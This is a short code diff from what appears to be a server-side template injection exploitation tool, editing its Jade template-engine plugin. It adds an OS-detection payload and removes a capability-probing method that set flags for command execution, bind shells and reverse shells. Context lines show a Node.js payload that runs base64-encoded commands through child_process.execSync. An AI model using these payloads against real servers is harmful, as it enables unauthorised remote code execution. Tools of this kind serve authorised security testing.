@@ -54,6 +54,9 @@ class Jade(javascript.Javascript):
                 'call': 'render',
                 'execute': """global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
             },
+            'evaluate' : {
+                'test_os': """global.process.mainModule.require('os').platform()"""
+            },
         })
 
         self.set_contexts([
@@ -71,19 +74,5 @@ class Jade(javascript.Javascript):
 
     language = 'javascript'
 
-    def rendered_detected(self):
-
-        os = self.evaluate("""global.process.mainModule.require('os').platform()""")
-        if os and re.search('^[\w-]+$', os):
-            self.set('os', os)
-            self.set('evaluate', self.language)
-            self.set('write', True)
-            self.set('read', True)
-
-            expected_rand = str(rand.randint_n(2))
-            if expected_rand == self.execute('echo %s' % expected_rand):
-                self.set('execute', True)
-                self.set('bind_shell', True)
-                self.set('reverse_shell', True)
 
 
